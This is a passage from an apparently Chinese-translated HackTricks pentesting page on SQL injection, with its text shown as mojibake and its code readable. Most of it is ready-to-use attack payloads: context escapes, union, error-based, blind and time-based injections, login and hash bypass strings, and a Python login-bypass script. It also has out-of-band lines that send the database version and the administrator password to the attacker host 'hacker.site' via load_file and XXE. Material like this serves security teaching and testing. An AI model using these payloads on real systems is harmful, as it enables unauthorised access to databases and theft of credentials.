# SQL æ³¨å…¥

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) æ˜¯ **è¥¿ç­ç‰™** æœ€ç›¸å…³çš„ç½‘ç»œå®‰å…¨äº‹ä»¶ï¼Œä¹Ÿæ˜¯ **æ¬§æ´²** æœ€é‡è¦çš„äº‹ä»¶ä¹‹ä¸€ã€‚è¯¥å¤§ä¼šçš„ **ä½¿å‘½æ˜¯ä¿ƒè¿›æŠ€æœ¯çŸ¥è¯†**ï¼Œæ˜¯å„ä¸ªå­¦ç§‘æŠ€æœ¯å’Œç½‘ç»œå®‰å…¨ä¸“ä¸šäººå£«çš„çƒ­çƒˆäº¤æµå¹³å°ã€‚

{% embed url="https://www.rootedcon.com/" %}

## ä»€ä¹ˆæ˜¯ SQL æ³¨å…¥ï¼Ÿ

**SQL æ³¨å…¥** æ˜¯ä¸€ç§å®‰å…¨æ¼æ´ï¼Œå…è®¸æ”»å‡»è€… **å¹²æ‰°åº”ç”¨ç¨‹åºçš„æ•°æ®åº“æŸ¥è¯¢**ã€‚æ­¤æ¼æ´ä½¿æ”»å‡»è€…èƒ½å¤Ÿ **æŸ¥çœ‹**ã€**ä¿®æ”¹** æˆ– **åˆ é™¤** ä»–ä»¬ä¸åº”è®¿é—®çš„æ•°æ®ï¼ŒåŒ…æ‹¬å…¶ä»–ç”¨æˆ·çš„ä¿¡æ¯æˆ–åº”ç”¨ç¨‹åºå¯ä»¥è®¿é—®çš„ä»»ä½•æ•°æ®ã€‚è¿™äº›è¡Œä¸ºå¯èƒ½å¯¼è‡´åº”ç”¨ç¨‹åºåŠŸèƒ½æˆ–å†…å®¹çš„æ°¸ä¹…æ€§æ›´æ”¹ï¼Œç”šè‡³å¯èƒ½å¯¼è‡´æœåŠ¡å™¨çš„æ³„éœ²æˆ–æœåŠ¡æ‹’ç»ã€‚

## å…¥å£ç‚¹æ£€æµ‹

å½“ä¸€ä¸ªç½‘ç«™ç”±äºå¯¹ä¸ SQLi ç›¸å…³çš„è¾“å…¥çš„å¼‚å¸¸æœåŠ¡å™¨å“åº”è€Œ **çœ‹ä¼¼æ˜“å— SQL æ³¨å…¥ (SQLi)** æ”»å‡»æ—¶ï¼Œ**ç¬¬ä¸€æ­¥** æ˜¯äº†è§£å¦‚ä½• **åœ¨ä¸å¹²æ‰°æŸ¥è¯¢çš„æƒ…å†µä¸‹æ³¨å…¥æ•°æ®**ã€‚è¿™éœ€è¦æœ‰æ•ˆè¯†åˆ« **é€ƒç¦»å½“å‰ä¸Šä¸‹æ–‡** çš„æ–¹æ³•ã€‚  
ä»¥ä¸‹æ˜¯ä¸€äº›æœ‰ç”¨çš„ç¤ºä¾‹ï¼š
```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
ç„¶åï¼Œæ‚¨éœ€è¦çŸ¥é“å¦‚ä½•**ä¿®å¤æŸ¥è¯¢ä»¥é¿å…é”™è¯¯**ã€‚ä¸ºäº†ä¿®å¤æŸ¥è¯¢ï¼Œæ‚¨å¯ä»¥**è¾“å…¥**æ•°æ®ï¼Œä»¥ä¾¿**å…ˆå‰çš„æŸ¥è¯¢æ¥å—æ–°æ•°æ®**ï¼Œæˆ–è€…æ‚¨å¯ä»¥ç›´æ¥**è¾“å…¥**æ‚¨çš„æ•°æ®å¹¶**åœ¨æœ«å°¾æ·»åŠ æ³¨é‡Šç¬¦å·**ã€‚

_è¯·æ³¨æ„ï¼Œå¦‚æœæ‚¨èƒ½çœ‹åˆ°é”™è¯¯æ¶ˆæ¯æˆ–èƒ½å¤Ÿå‘ç°æŸ¥è¯¢æ­£å¸¸å·¥ä½œä¸ä¸æ­£å¸¸å·¥ä½œæ—¶çš„å·®å¼‚ï¼Œè¿™ä¸ªé˜¶æ®µå°†ä¼šæ›´å®¹æ˜“ã€‚_

### **è¯„è®º**
```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
### ç¡®è®¤é€»è¾‘æ“ä½œ

ç¡®è®¤SQLæ³¨å…¥æ¼æ´çš„å¯é æ–¹æ³•æ¶‰åŠæ‰§è¡Œ**é€»è¾‘æ“ä½œ**å¹¶è§‚å¯Ÿé¢„æœŸç»“æœã€‚ä¾‹å¦‚ï¼ŒGETå‚æ•°å¦‚`?username=Peter`åœ¨ä¿®æ”¹ä¸º`?username=Peter' or '1'='1`æ—¶äº§ç”Ÿç›¸åŒå†…å®¹ï¼Œè¡¨æ˜å­˜åœ¨SQLæ³¨å…¥æ¼æ´ã€‚

åŒæ ·ï¼Œåº”ç”¨**æ•°å­¦æ“ä½œ**ä½œä¸ºæœ‰æ•ˆçš„ç¡®è®¤æŠ€æœ¯ã€‚ä¾‹å¦‚ï¼Œå¦‚æœè®¿é—®`?id=1`å’Œ`?id=2-1`äº§ç”Ÿç›¸åŒç»“æœï¼Œè¿™è¡¨æ˜å­˜åœ¨SQLæ³¨å…¥ã€‚

æ¼”ç¤ºé€»è¾‘æ“ä½œç¡®è®¤çš„ç¤ºä¾‹ï¼š
```
page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
```
è¿™ä¸ªè¯æ±‡è¡¨æ˜¯ä¸ºäº†å°è¯•**ç¡®è®¤SQLæ³¨å…¥**è€Œåˆ›å»ºçš„ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š

{% file src="../../.gitbook/assets/sqli-logic.txt" %}

### é€šè¿‡æ—¶é—´ç¡®è®¤

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ‚¨**ä¸ä¼šæ³¨æ„åˆ°ä»»ä½•å˜åŒ–**åœ¨æ‚¨æ­£åœ¨æµ‹è¯•çš„é¡µé¢ä¸Šã€‚å› æ­¤ï¼Œå‘ç°ç›²æ³¨å…¥çš„ä¸€ä¸ªå¥½æ–¹æ³•æ˜¯è®©æ•°æ®åº“æ‰§è¡Œæ“ä½œï¼Œå¹¶å¯¹é¡µé¢åŠ è½½æ‰€éœ€çš„**æ—¶é—´äº§ç”Ÿå½±å“**ã€‚\
å› æ­¤ï¼Œæˆ‘ä»¬å°†åœ¨SQLæŸ¥è¯¢ä¸­è¿æ¥ä¸€ä¸ªéœ€è¦å¾ˆé•¿æ—¶é—´æ‰èƒ½å®Œæˆçš„æ“ä½œï¼š
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œ**sleep å‡½æ•°å°†ä¸è¢«å…è®¸**ã€‚ç„¶åï¼Œæ‚¨å¯ä»¥ä½¿æŸ¥è¯¢**æ‰§è¡Œå¤æ‚æ“ä½œ**ï¼Œè¿™å°†éœ€è¦å‡ ç§’é’Ÿã€‚_è¿™äº›æŠ€æœ¯çš„ç¤ºä¾‹å°†åœ¨æ¯ç§æŠ€æœ¯ä¸Šå•ç‹¬è¯„è®ºï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰_ã€‚

### è¯†åˆ«åç«¯

è¯†åˆ«åç«¯çš„æœ€ä½³æ–¹æ³•æ˜¯å°è¯•æ‰§è¡Œä¸åŒåç«¯çš„å‡½æ•°ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä¸Šä¸€èŠ‚çš„_**sleep**_ **å‡½æ•°**æˆ–è¿™äº›å‡½æ•°ï¼ˆæ¥è‡ª [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification) çš„è¡¨ï¼‰ï¼š
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæ‚¨å¯ä»¥è®¿é—®æŸ¥è¯¢çš„è¾“å‡ºï¼Œæ‚¨å¯ä»¥è®©å®ƒ**æ‰“å°æ•°æ®åº“çš„ç‰ˆæœ¬**ã€‚

{% hint style="info" %}
æ¥ä¸‹æ¥æˆ‘ä»¬å°†è®¨è®ºä¸åŒçš„æ–¹æ³•æ¥åˆ©ç”¨ä¸åŒç±»å‹çš„SQLæ³¨å…¥ã€‚æˆ‘ä»¬å°†ä»¥MySQLä¸ºä¾‹ã€‚
{% endhint %}

### ä½¿ç”¨PortSwiggerè¿›è¡Œè¯†åˆ«

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

## åˆ©ç”¨åŸºäºè”åˆçš„æ”»å‡»

### æ£€æµ‹åˆ—æ•°

å¦‚æœæ‚¨å¯ä»¥çœ‹åˆ°æŸ¥è¯¢çš„è¾“å‡ºï¼Œè¿™æ˜¯åˆ©ç”¨å®ƒçš„æœ€ä½³æ–¹æ³•ã€‚\
é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦æ‰¾å‡º**åˆå§‹è¯·æ±‚**è¿”å›çš„**åˆ—æ•°**ã€‚è¿™æ˜¯å› ä¸º**ä¸¤ä¸ªæŸ¥è¯¢å¿…é¡»è¿”å›ç›¸åŒæ•°é‡çš„åˆ—**ã€‚\
é€šå¸¸ä½¿ç”¨ä¸¤ç§æ–¹æ³•æ¥å®ç°è¿™ä¸€ç›®çš„ï¼š

#### Order/Group by

è¦ç¡®å®šæŸ¥è¯¢ä¸­çš„åˆ—æ•°ï¼Œé€æ­¥è°ƒæ•´**ORDER BY**æˆ–**GROUP BY**å­å¥ä¸­ä½¿ç”¨çš„æ•°å­—ï¼Œç›´åˆ°æ”¶åˆ°é”™è¯¯å“åº”ã€‚å°½ç®¡**GROUP BY**å’Œ**ORDER BY**åœ¨SQLä¸­å…·æœ‰ä¸åŒçš„åŠŸèƒ½ï¼Œä½†ä¸¤è€…å¯ä»¥ä»¥ç›¸åŒçš„æ–¹å¼ç”¨äºç¡®å®šæŸ¥è¯¢çš„åˆ—æ•°ã€‚
```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```
#### UNION SELECT

é€‰æ‹©æ›´å¤šçš„ç©ºå€¼ï¼Œç›´åˆ°æŸ¥è¯¢æ­£ç¡®ï¼š
```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
_æ‚¨åº”è¯¥ä½¿ç”¨ `null` å€¼ï¼Œå› ä¸ºåœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒæŸ¥è¯¢ä¸¤ä¾§çš„åˆ—ç±»å‹å¿…é¡»ç›¸åŒï¼Œè€Œ null åœ¨æ¯ç§æƒ…å†µä¸‹éƒ½æ˜¯æœ‰æ•ˆçš„ã€‚_

### æå–æ•°æ®åº“åç§°ã€è¡¨åç§°å’Œåˆ—åç§°

åœ¨æ¥ä¸‹æ¥çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬å°†æ£€ç´¢æ‰€æœ‰æ•°æ®åº“çš„åç§°ã€æ•°æ®åº“çš„è¡¨åç§°ã€è¡¨çš„åˆ—åç§°ï¼š
```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```
_æ¯ä¸ªä¸åŒçš„æ•°æ®åº“éƒ½æœ‰ä¸åŒçš„æ–¹æ³•æ¥å‘ç°è¿™äº›æ•°æ®ï¼Œä½†æ–¹æ³•è®ºå§‹ç»ˆç›¸åŒã€‚_

## åˆ©ç”¨éšè—çš„åŸºäºè”åˆçš„æ³¨å…¥

å½“æŸ¥è¯¢çš„è¾“å‡ºå¯è§ï¼Œä½†åŸºäºè”åˆçš„æ³¨å…¥ä¼¼ä¹æ— æ³•å®ç°æ—¶ï¼Œè¿™è¡¨æ˜å­˜åœ¨**éšè—çš„åŸºäºè”åˆçš„æ³¨å…¥**ã€‚è¿™ç§æƒ…å†µé€šå¸¸ä¼šå¯¼è‡´ç›²æ³¨å…¥çš„æƒ…å†µã€‚è¦å°†ç›²æ³¨å…¥è½¬å˜ä¸ºåŸºäºè”åˆçš„æ³¨å…¥ï¼Œéœ€è¦è¯†åˆ«åç«¯çš„æ‰§è¡ŒæŸ¥è¯¢ã€‚

è¿™å¯ä»¥é€šè¿‡ä½¿ç”¨ç›²æ³¨å…¥æŠ€æœ¯ä»¥åŠç‰¹å®šäºç›®æ ‡æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆDBMSï¼‰çš„é»˜è®¤è¡¨æ¥å®ç°ã€‚ä¸ºäº†ç†è§£è¿™äº›é»˜è®¤è¡¨ï¼Œå»ºè®®æŸ¥é˜…ç›®æ ‡DBMSçš„æ–‡æ¡£ã€‚

ä¸€æ—¦æå–äº†æŸ¥è¯¢ï¼Œå°±éœ€è¦è°ƒæ•´ä½ çš„æœ‰æ•ˆè½½è·ä»¥å®‰å…¨åœ°å…³é—­åŸå§‹æŸ¥è¯¢ã€‚éšåï¼Œå°†ä¸€ä¸ªè”åˆæŸ¥è¯¢é™„åŠ åˆ°ä½ çš„æœ‰æ•ˆè½½è·ä¸­ï¼Œä»è€Œåˆ©ç”¨æ–°å¯è®¿é—®çš„åŸºäºè”åˆçš„æ³¨å…¥ã€‚

æœ‰å…³æ›´å…¨é¢çš„è§è§£ï¼Œè¯·å‚é˜…å®Œæ•´æ–‡ç«  [Healing Blind Injections](https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f)ã€‚

## åˆ©ç”¨åŸºäºé”™è¯¯çš„æ³¨å…¥

å¦‚æœç”±äºæŸç§åŸå› ä½ **æ— æ³•**çœ‹åˆ°**æŸ¥è¯¢**çš„**è¾“å‡º**ï¼Œä½†ä½ å¯ä»¥**çœ‹åˆ°é”™è¯¯æ¶ˆæ¯**ï¼Œä½ å¯ä»¥åˆ©ç”¨è¿™äº›é”™è¯¯æ¶ˆæ¯æ¥**æå–**æ•°æ®åº“ä¸­çš„æ•°æ®ã€‚\
éµå¾ªä¸åŸºäºè”åˆçš„åˆ©ç”¨ç›¸ä¼¼çš„æµç¨‹ï¼Œä½ å¯ä»¥æˆåŠŸåœ°è½¬å‚¨æ•°æ®åº“ã€‚
```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```
## åˆ©ç”¨ç›²æ³¨å…¥

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨æ— æ³•çœ‹åˆ°æŸ¥è¯¢çš„ç»“æœæˆ–é”™è¯¯ï¼Œä½†æ‚¨å¯ä»¥**åŒºåˆ†**æŸ¥è¯¢ä½•æ—¶**è¿”å›****çœŸ**æˆ–**å‡**å“åº”ï¼Œå› ä¸ºé¡µé¢ä¸Šæœ‰ä¸åŒçš„å†…å®¹ã€‚\
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨è¿™ç§è¡Œä¸ºé€å­—ç¬¦åœ°è½¬å‚¨æ•°æ®åº“ï¼š
```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```
## åˆ©ç”¨é”™è¯¯ç›²SQLi

è¿™ä¸ä¹‹å‰çš„**æƒ…å†µç›¸åŒ**ï¼Œä½†ä¸æ˜¯åŒºåˆ†æŸ¥è¯¢çš„çœŸ/å‡å“åº”ï¼Œè€Œæ˜¯å¯ä»¥**åŒºåˆ†**SQLæŸ¥è¯¢ä¸­çš„**é”™è¯¯**ä¸å¦ï¼ˆå¯èƒ½æ˜¯å› ä¸ºHTTPæœåŠ¡å™¨å´©æºƒï¼‰ã€‚å› æ­¤ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ¯æ¬¡æ­£ç¡®çŒœæµ‹å­—ç¬¦æ—¶ï¼Œæ‚¨å¯ä»¥å¼ºåˆ¶äº§ç”Ÿä¸€ä¸ªSQLé”™è¯¯ï¼š
```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```
## åˆ©ç”¨åŸºäºæ—¶é—´çš„ SQLi

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ**æ²¡æœ‰**ä»»ä½•æ–¹æ³•å¯ä»¥æ ¹æ®é¡µé¢çš„ä¸Šä¸‹æ–‡æ¥**åŒºåˆ†**æŸ¥è¯¢çš„**å“åº”**ã€‚ä½†æ˜¯ï¼Œå¦‚æœçŒœæµ‹çš„å­—ç¬¦æ˜¯æ­£ç¡®çš„ï¼Œæ‚¨å¯ä»¥ä½¿é¡µé¢**åŠ è½½æ—¶é—´æ›´é•¿**ã€‚æˆ‘ä»¬å·²ç»åœ¨ä¹‹å‰çœ‹åˆ°è¿‡è¿™ç§æŠ€æœ¯ç”¨äº[ç¡®è®¤ SQLi æ¼æ´](./#confirming-with-timing)ã€‚
```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```
## Stacked Queries

æ‚¨å¯ä»¥ä½¿ç”¨å †å æŸ¥è¯¢æ¥**è¿ç»­æ‰§è¡Œå¤šä¸ªæŸ¥è¯¢**ã€‚è¯·æ³¨æ„ï¼Œå°½ç®¡åç»­æŸ¥è¯¢ä¼šè¢«æ‰§è¡Œï¼Œä½†**ç»“æœ**ä¸ä¼š**è¿”å›ç»™åº”ç”¨ç¨‹åº**ã€‚å› æ­¤ï¼Œè¿™ç§æŠ€æœ¯ä¸»è¦ç”¨äºä¸**ç›²æ¼æ´**ç›¸å…³çš„æƒ…å†µï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ç¬¬äºŒä¸ªæŸ¥è¯¢è§¦å‘DNSæŸ¥æ‰¾ã€æ¡ä»¶é”™è¯¯æˆ–æ—¶é—´å»¶è¿Ÿã€‚

**Oracle**ä¸æ”¯æŒ**å †å æŸ¥è¯¢**ã€‚**MySQLã€Microsoft**å’Œ**PostgreSQL**æ”¯æŒå®ƒä»¬ï¼š`QUERY-1-HERE; QUERY-2-HERE`

## Out of band Exploitation

å¦‚æœ**æ²¡æœ‰å…¶ä»–**åˆ©ç”¨æ–¹æ³•**æœ‰æ•ˆ**ï¼Œæ‚¨å¯ä»¥å°è¯•ä½¿**æ•°æ®åº“å°†**ä¿¡æ¯å¤–æ³„åˆ°æ‚¨æ§åˆ¶çš„**å¤–éƒ¨ä¸»æœº**ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡DNSæŸ¥è¯¢ï¼š
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```
### é€šè¿‡ XXE è¿›è¡Œå¸¦å¤–æ•°æ®æ³„éœ²
```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```
## è‡ªåŠ¨åŒ–åˆ©ç”¨

æŸ¥çœ‹ [SQLMap Cheatsheet](sqlmap/) ä»¥åˆ©ç”¨ SQLi æ¼æ´ä¸ [**sqlmap**](https://github.com/sqlmapproject/sqlmap)ã€‚

## æŠ€æœ¯ç‰¹å®šä¿¡æ¯

æˆ‘ä»¬å·²ç»è®¨è®ºäº†åˆ©ç”¨ SQL æ³¨å…¥æ¼æ´çš„æ‰€æœ‰æ–¹æ³•ã€‚åœ¨æœ¬ä¹¦ä¸­æ‰¾åˆ°ä¸€äº›æ›´å¤šä¾èµ–äºæ•°æ®åº“æŠ€æœ¯çš„æŠ€å·§ï¼š

* [MS Access](ms-access-sql-injection.md)
* [MSSQL](mssql-injection.md)
* [MySQL](mysql-injection/)
* [Oracle](oracle-injection.md)
* [PostgreSQL](postgresql-injection/)

æˆ–è€…ä½ ä¼šåœ¨ [**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) æ‰¾åˆ° **å…³äºï¼šMySQLã€PostgreSQLã€Oracleã€MSSQLã€SQLite å’Œ HQL çš„å¤§é‡æŠ€å·§**



<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/) æ˜¯ **è¥¿ç­ç‰™** æœ€ç›¸å…³çš„ç½‘ç»œå®‰å…¨äº‹ä»¶ï¼Œä¹Ÿæ˜¯ **æ¬§æ´²** æœ€é‡è¦çš„äº‹ä»¶ä¹‹ä¸€ã€‚ä»¥ **ä¿ƒè¿›æŠ€æœ¯çŸ¥è¯†ä¸ºä½¿å‘½**ï¼Œè¿™ä¸ªå¤§ä¼šæ˜¯å„ä¸ªå­¦ç§‘æŠ€æœ¯å’Œç½‘ç»œå®‰å…¨ä¸“ä¸šäººå£«çš„çƒ­çƒˆäº¤æµç‚¹ã€‚

{% embed url="https://www.rootedcon.com/" %}

## è®¤è¯ç»•è¿‡

å°è¯•ç»•è¿‡ç™»å½•åŠŸèƒ½çš„åˆ—è¡¨ï¼š

{% content-ref url="../login-bypass/sql-login-bypass.md" %}
[sql-login-bypass.md](../login-bypass/sql-login-bypass.md)
{% endcontent-ref %}

### åŸå§‹å“ˆå¸Œè®¤è¯ç»•è¿‡
```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
æ­¤æŸ¥è¯¢å±•ç¤ºäº†åœ¨èº«ä»½éªŒè¯æ£€æŸ¥ä¸­ä½¿ç”¨MD5å¹¶å°†åŸå§‹è¾“å‡ºè®¾ç½®ä¸ºtrueæ—¶çš„æ¼æ´ï¼Œä½¿ç³»ç»Ÿå®¹æ˜“å—åˆ°SQLæ³¨å…¥æ”»å‡»ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ è¾“å…¥æ¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œè¿™äº›è¾“å…¥åœ¨å“ˆå¸Œåä¼šç”Ÿæˆæ„å¤–çš„SQLå‘½ä»¤éƒ¨åˆ†ï¼Œä»è€Œå¯¼è‡´æœªç»æˆæƒçš„è®¿é—®ã€‚
```sql
md5("ffifdyop", true) = 'or'6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½bï¿½
sha1("3fDf ", true) = Qï¿½u'='ï¿½@ï¿½[ï¿½tï¿½- oï¿½ï¿½_-!
```
### æ³¨å…¥å“ˆå¸Œè®¤è¯ç»•è¿‡
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
**æ¨èåˆ—è¡¨**ï¼š

æ‚¨åº”è¯¥å°†åˆ—è¡¨ä¸­çš„æ¯ä¸€è¡Œç”¨ä½œç”¨æˆ·åï¼Œå¯†ç å§‹ç»ˆä¸ºï¼š _**Pass1234.**_\
_(è¿™äº›æœ‰æ•ˆè½½è·ä¹ŸåŒ…å«åœ¨æœ¬èŠ‚å¼€å¤´æåˆ°çš„å¤§åˆ—è¡¨ä¸­)_

{% file src="../../.gitbook/assets/sqli-hashbypass.txt" %}

### GBK è®¤è¯ç»•è¿‡

å¦‚æœ ' è¢«è½¬ä¹‰ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ %A8%27ï¼Œå½“ ' è¢«è½¬ä¹‰æ—¶ï¼Œå°†åˆ›å»ºï¼š 0xA80x5c0x27 (_â•˜'_)
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```
Python è„šæœ¬ï¼š
```python
import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"}
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url})
print r.text
```
### å¤šè¯­è¨€æ³¨å…¥ï¼ˆå¤šä¸Šä¸‹æ–‡ï¼‰
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
## Insert Statement

### ä¿®æ”¹ç°æœ‰å¯¹è±¡/ç”¨æˆ·çš„å¯†ç 

ä¸ºæ­¤ï¼Œæ‚¨åº”è¯¥å°è¯•**åˆ›å»ºä¸€ä¸ªåä¸ºâ€œä¸»å¯¹è±¡â€çš„æ–°å¯¹è±¡**ï¼ˆåœ¨ç”¨æˆ·çš„æƒ…å†µä¸‹å¯èƒ½æ˜¯**admin**ï¼‰ï¼Œä¿®æ”¹æŸäº›å†…å®¹ï¼š

* åˆ›å»ºåä¸ºï¼š**AdMIn**ï¼ˆå¤§å°å†™å­—æ¯ï¼‰
* åˆ›å»ºåä¸ºï¼š**admin=**çš„ç”¨æˆ·
